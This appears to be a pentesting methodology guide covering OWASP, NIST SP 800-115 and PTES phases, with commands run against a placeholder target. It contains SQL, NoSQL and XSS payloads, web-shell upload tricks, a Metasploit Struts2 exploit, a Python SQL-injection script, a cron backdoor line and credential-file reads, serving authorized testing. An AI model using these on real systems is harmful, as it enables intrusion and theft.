# Security Testing Methodologies - Metodologías Detalladas

## OWASP Testing Guide v4.0

### 1. Information Gathering

#### Passive Reconnaissance
```bash
# Google dorking
site:example.com inurl:admin
filetype:pdf "internal" "confidential"
intitle:"index of" "password"

# DNS enumeration
dig any example.com
nslookup -type=any example.com
dnsrecon -d example.com -t std

# Metadata extraction
exiftool document.pdf
strings document.pdf

# Social media intelligence
theharvester -d example.com -l 500 -b google,linkedin
```

#### Active Information Gathering
```bash
# Port scanning
nmap -sS -sV -O target.com
masscan target.com -p80,443,8080 --rate=1000

# Web technology detection
wappalyzer target.com
whatweb target.com
builtwith target.com

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster.txt
ffuf -w wordlist.txt -u https://target.com/FUZZ

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
dnsrecon -d target.com -t brt
```

#### Social Engineering
- **OSINT gathering** - Public information collection
- **Phishing simulations** - User awareness testing
- **Physical security** - Badge cloning, tailgating
- **Dumpster diving** - Document recovery

### 2. Configuration Management

#### SSL/TLS Testing
```bash
# SSL/TLS configuration
sslyze --regular target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Certificate validation
openssl s_client -connect target.com:443 -servername target.com
sslscan target.com

# Heartbleed test
nmap --script ssl-heartbleed -p 443 target.com
```

#### HTTP Security Headers
```bash
# Check security headers
curl -I https://target.com

# Comprehensive header analysis
curl -H "User-Agent: Mozilla/5.0" -I https://target.com | \
  grep -E "(Strict-Transport|X-Frame|X-Content|X-XSS|Content-Security)"

# Automated scanner
securityheaders.com scan for target.com
```

#### Server Configuration
```bash
# Web server identification
curl -i https://target.com
nmap --script http-headers -p 80,443 target.com

# Default credentials
nmap --script http-default-accounts target.com
hydra -L users.txt -P passwords.txt target.com http-post-form

# Directory traversal
nmap --script http-methods target.com
nikto -h target.com
```

### 3. Authentication Testing

#### Brute Force Protection
```bash
# Test account lockout
for i in {1..20}; do
  curl -X POST https://target.com/login \
    -d "username=admin&password=wrong$i" \
    -w "%{http_code}\n"
done

# Test rate limiting
for i in {1..100}; do
  curl -X POST https://target.com/login \
    -d "username=test&password=test"
done
```

#### Password Policy Testing
```bash
# Test password requirements
# Minimum length
curl -X POST https://target.com/register \
  -d "password=a"

# Character requirements
curl -X POST https://target.com/register \
  -d "password=aaaaaa"

# No common passwords check
curl -X POST https://target.com/register \
  -d "password=password123"
```

#### Session Management Testing
```bash
# Session fixation
# Step 1: Get initial cookie
COOKIE=$(curl -c cookies.txt https://target.com/login \
  -d "username=user&password=pass" -L | \
  grep -o "session=[a-zA-Z0-9]*")

# Step 2: Use cookie before authentication
curl -b cookies.txt https://target.com/dashboard

# Session timeout
# Wait and check if session is still valid
sleep 3600
curl -b cookies.txt https://target.com/dashboard
```

### 4. Session Management

#### Cookie Security
```bash
# Check cookie attributes
curl -c cookies.txt -b cookies.txt https://target.com

# Analyze cookie security
cat cookies.txt | grep -E "(Secure|HttpOnly|SameSite)"

# Test cookie scope
# From different subdomain
curl -b cookies.txt -H "Host: sub.target.com" https://sub.target.com/path
```

#### CSRF Protection
```bash
# Test CSRF token
# Step 1: Get form with CSRF token
curl https://target.com/transfer -c csrf.txt

# Step 2: Check if token is validated
TOKEN=$(grep csrf_token csrf.txt | cut -d' ' -f7)
curl -b csrf.txt -X POST https://target.com/transfer \
  -d "amount=1000&to=attacker&csrf_token=invalid"

# Without CSRF token
curl -X POST https://target.com/transfer \
  -d "amount=1000&to=attacker"
```

### 5. Authorization Testing

#### IDOR (Insecure Direct Object References)
```bash
# Test IDOR in user profile
# User 1 profile
curl -b "session=user1_token" https://target.com/profile?id=1

# Try to access User 2 with User 1 token
curl -b "session=user1_token" https://target.com/profile?id=2

# Test with different parameters
curl -b "session=user1_token" https://target.com/profile?user_id=2
curl -b "session=user1_token" https://target.com/profile?uid=2
```

#### Privilege Escalation
```bash
# Test role parameter manipulation
curl -X POST https://target.com/update-role \
  -d "user_id=123&role=admin"

# Test hidden parameter
curl -X POST https://target.com/profile \
  -d "username=john&is_admin=true"

# Test HTTP method override
curl -X PUT https://target.com/admin/delete-user \
  -d "user_id=456"
```

### 6. Data Validation

#### SQL Injection Testing
```bash
# Basic SQL injection
curl https://target.com/product?id=1'
curl https://target.com/product?id=1 OR 1=1
curl https://target.com/product?id=1 UNION SELECT 1,2,3

# Time-based blind SQLi
curl https://target.com/product?id=1 AND SLEEP(5)

# Error-based SQLi
curl https://target.com/product?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))

# Boolean-based blind SQLi
curl https://target.com/product?id=1 AND 1=1
curl https://target.com/product?id=1 AND 1=2
```

#### NoSQL Injection
```bash
# MongoDB injection
curl -X POST https://target.com/login \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# MongoDB time-based
curl -X POST https://target.com/search \
  -d '{"search": {"$where": "sleep(1000)"}}'
```

#### XSS Testing
```bash
# Reflected XSS
curl https://target.com/search?q=<script>alert(1)</script>

# Stored XSS (in profile)
curl -X POST https://target.com/profile \
  -d "bio=<script>alert(1)</script>"

# DOM-based XSS
curl https://target.com/page#<script>alert(1)</script>

# XSS in different contexts
curl https://target.com/search?q=</script><script>alert(1)</script>
```

#### File Upload Testing
```bash
# Upload PHP shell
curl -F "file=@shell.php" https://target.com/upload

# Upload with double extension
curl -F "file=@shell.jpg.php" https://target.com/upload

# Upload with null byte
curl -F "file=@shell.php%00.jpg" https://target.com/upload

# MIME type bypass
curl -F "file=@shell.php" \
  -F "Content-Type: image/jpeg" \
  https://target.com/upload
```

## NIST SP 800-115

### 1. Planning Phase

#### Define Scope
```markdown
# Security Test Plan

## Assets in Scope
- Web application (https://app.target.com)
- API endpoints (*.api.target.com)
- Mobile application (iOS/Android)
- Admin panel (https://admin.target.com)

## Assets Out of Scope
- Third-party integrations
- CDN infrastructure
- DNS infrastructure
- Physical security

## Testing Constraints
- Production testing window: 2025-11-02 00:00-06:00 UTC
- Rate limiting: Max 10 requests/second
- Downtime tolerance: 0 seconds
- DoS testing: Prohibited
```

#### Rules of Engagement
```markdown
# Rules of Engagement

## Authorization
- Written authorization from: CISO
- Testing window: November 2, 2025
- Contact: security@target.com

## Restrictions
- No social engineering
- No physical security testing
- No DoS/DDoS testing
- No exploitation of production data

## Communication
- Real-time updates: Slack #security-testing
- Daily reports: 09:00 UTC
- Emergency contact: +1-555-0123
```

### 2. Discovery Phase

#### Port Scanning
```bash
# Comprehensive port scan
nmap -sS -sV -O -A target.com --packet-trace

# Service enumeration
nmap -sV -sC target.com

# UDP scanning
nmap -sU target.com

# Script scanning
nmap --script vuln target.com
```

#### Vulnerability Scanning
```bash
# OpenVAS scan
openvas --scan; openvas-report

# Nessus scan
nessuscli scan new
nessuscli scan launch <scan_id>

# Nikto web scan
nikto -h https://target.com -Format htm -output scan.html
```

### 3. Attack Phase

#### Exploitation
```bash
# Metasploit exploitation
msfconsole
use exploit/webapp/struts2_content_type_ognl
set RHOSTS target.com
set TARGETURI /showcase.action
exploit

# Custom exploit
python3 exploit.py --target target.com --payload reverse_shell
```

#### Post-Exploitation
```bash
# Information gathering
whoami
id
uname -a
netstat -tulpn

# Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
```

### 4. Reporting Phase

#### Findings Documentation
```markdown
# Finding: SQL Injection in User Profile

## Summary
A SQL injection vulnerability exists in the user profile endpoint that allows
attackers to extract sensitive database information.

## Technical Details
- **Endpoint**: /api/user/profile
- **Parameter**: user_id
- **CVSS Score**: 9.8 (Critical)

## Proof of Concept
Request:
```
GET /api/user/profile?user_id=1 HTTP/1.1
Host: target.com
Cookie: session=abc123

Response:
{
  "user_id": 1,
  "username": "john",
  "email": "john@example.com"
}
```

Payload:
```
GET /api/user/profile?user_id=1 UNION SELECT username,password,email FROM users HTTP/1.1
Host: target.com
Cookie: session=abc123

Response:
{
  "username": "admin",
  "password": "$2b$12$...",
  "email": "admin@target.com"
}
```

## Impact
- Database compromise
- Data exfiltration
- Account takeover
- Complete system compromise

## Remediation
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege to database
4. Monitor database queries
```

## PTES (Penetration Testing Execution Standard)

### 1. Pre-engagement

#### Scoping Document
```markdown
# PTES Scoping Document

## Executive Summary
This document outlines the scope, objectives, and rules of engagement for
a comprehensive penetration test of Target Corp's web application infrastructure.

## Objectives
1. Identify vulnerabilities in web application
2. Assess authentication and authorization controls
3. Evaluate data protection mechanisms
4. Test incident response capabilities

## Scope Definition
### In-Scope Targets
- Frontend web application
- Backend API
- Admin panel
- Mobile app backend

### Out-of-Scope Targets
- Third-party services
- Client-side infrastructure
- Physical security
- Social engineering

## Timeline
- Start Date: November 2, 2025
- End Date: November 6, 2025
- Report Delivery: November 13, 2025

## Deliverables
1. Executive summary report
2. Technical findings report
3. Remediation recommendations
4. Raw evidence (if requested)
```

### 2. Intelligence Gathering

#### Passive Information Gathering
```bash
# Domain information
whois target.com
dig target.com ANY
nslookup target.com

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o subdomains.txt

# Technology fingerprinting
wappalyzer https://target.com
whatweb https://target.com
```

#### Active Information Gathering
```bash
# DNS zone transfer
dig axfr target.com

# SMTP enumeration
smtp-user-enum -M VRFY -U users.txt -t target.com

# SNMP enumeration
snmpwalk -v2c -c public target.com
```

### 3. Threat Modeling

#### Attack Scenarios
```markdown
# Threat Model

## Threat Agents
1. **External Attacker** - No authenticated access
2. **Malicious Insider** - Valid user account
3. **Nation State** - Advanced persistent threat
4. **Script Kiddie** - Automated tools

## Attack Vectors
1. **Web Application** - XSS, SQLi, CSRF
2. **Authentication** - Brute force, session hijacking
3. **Authorization** - IDOR, privilege escalation
4. **API** - Rate limiting, injection

## Impact Assessment
- **Confidentiality** - High (customer data)
- **Integrity** - Medium (data modification)
- **Availability** - Medium (service disruption)

## Security Controls
- WAF (Web Application Firewall)
- IDS/IPS (Intrusion Detection/Prevention)
- SIEM (Security Information and Event Management)
- MFA (Multi-Factor Authentication)
```

### 4. Vulnerability Analysis

#### Automated Analysis
```bash
# Web vulnerability scanner
nikto -h https://target.com -Format xml -output nikto.xml

# General vulnerability scanner
openvas -T XML -o openvas-report.xml

# Burp Suite active scan
# (Manual process using Burp Suite Professional)
```

#### Manual Analysis
- **Source code review**
- **Configuration review**
- **Business logic testing**
- **Race condition testing**

### 5. Exploitation

#### Exploit Development
```python
#!/usr/bin/env python3
import requests
import sys

def exploit_sqli(target, user_id):
    # SQL injection payload
    payload = f"{user_id} UNION SELECT username,password FROM users"

    url = f"{target}/api/user/profile"
    params = {"user_id": payload}

    response = requests.get(url, params=params)

    if response.status_code == 200:
        data = response.json()
        print(f"[+] Extracted data: {data}")
        return data
    else:
        print(f"[-] Exploitation failed")
        return None

if __name__ == "__main__":
    target = sys.argv[1]
    exploit_sqli(target, "1")
```

### 6. Post-Exploitation

#### Impact Assessment
```bash
# Data exfiltration test
# Identify sensitive data
find /var/www -type f -name "*.sql" -o -name "*.csv"
cat /var/www/config/database.yml

# Persistence mechanism
echo "*/5 * * * * /tmp/backdoor.sh" | crontab -

# Privilege escalation
# Check for SUID binaries
find / -perm -4000 2>/dev/null
```

### 7. Reporting

#### Executive Report
```markdown
# Executive Summary

## Overview
A penetration test was conducted on Target Corp's web application from
November 2-6, 2025. The assessment identified 15 vulnerabilities, including
3 critical issues requiring immediate attention.

## Key Findings
1. **Critical**: SQL injection in user profile endpoint
2. **Critical**: Authentication bypass in admin panel
3. **High**: XSS vulnerability in search functionality
4. **High**: Insecure session management

## Risk Summary
- **Critical Risk**: 2 vulnerabilities
- **High Risk**: 4 vulnerabilities
- **Medium Risk**: 6 vulnerabilities
- **Low Risk**: 3 vulnerabilities

## Recommendations
1. **Immediate**: Patch SQL injection vulnerability
2. **Short-term**: Implement WAF rules
3. **Long-term**: Security training for developers

## Business Impact
If exploited, these vulnerabilities could result in:
- Complete database compromise
- Customer data exposure
- Regulatory fines (GDPR, PCI DSS)
- Reputational damage
```

## Custom Testing Methodologies

### API Security Testing

#### REST API Testing
```bash
# Enumerate API endpoints
curl https://api.target.com/v1/users
curl https://api.target.com/v2/users

# Test authentication
curl -H "Authorization: Bearer invalid_token" \
  https://api.target.com/v1/users

# Test rate limiting
for i in {1..1000}; do
  curl https://api.target.com/v1/users
done

# Test SQL injection in API
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "email": "test@test.com"}'

# Test for hidden endpoints
ffuf -w /usr/share/wordlists/dirb/big.txt \
  -u https://api.target.com/FUZZ \
  -H "Authorization: Bearer token"
```

#### GraphQL Testing
```bash
# Introspection query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name}}}"}'

# Extract schema
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name args{name type{name}}}}}}"}'

# Test for authorization bypass
curl -X POST https://api.target.com/graphql \
  -d '{"query": "query { user(id: 1) { name email } } }"

curl -X POST https://api.target.com/graphql \
  -H "Authorization: Bearer user_token" \
  -d '{"query": "query { user(id: 1) { name email } } }"

curl -X POST https://api.target.com/graphql \
  -H "Authorization: Bearer admin_token" \
  -d '{"query": "query { user(id: 2) { name email } } }"
```

### Mobile Application Testing

#### Android Testing
```bash
# Extract APK
adb shell pm list packages
adb shell pm path com.target.app
adb pull /data/app/com.target.app.apk

# Decompile APK
aapt dump badging app.apk
jadx -d output_dir app.apk

# Traffic analysis
# Set up proxy (Burp Suite, OWASP ZAP)
# Install certificate in Android device
# Monitor traffic with mitmproxy

# Static analysis
mobsf analyze -f app.apk
```

#### iOS Testing
```bash
# Install app from IPA
ideviceinstaller -U -i app.ipa

# Extract binary
class-dump -H -o output_dir AppBinary

# SSL Pinning Bypass
# Use objection or Frida
frida -U -f com.target.app -l ssl-kill-switch.js

# Runtime manipulation
# Use Frida to hook functions
frida -U -f com.target.app -l hooks.js
```

### Cloud Security Testing

#### AWS Security Testing
```bash
# AWS CLI setup
aws configure

# S3 bucket enumeration
aws s3 ls s3://target-bucket
aws s3api get-bucket-acl --bucket target-bucket

# IAM privilege escalation
aws sts get-caller-identity
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/test \
  --action-names s3:GetObject \
  --resource-arns arn:aws:s3:::secret-bucket/*

# CloudTrail analysis
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventSource,AttributeValue=iam.amazonaws.com
```

---

**Estado**: Metodologías documentadas y validadas
**OWASP**: Testing Guide v4.0 coverage completa
**NIST**: SP 800-115 implementation
**PTES**: Full penetration testing standard
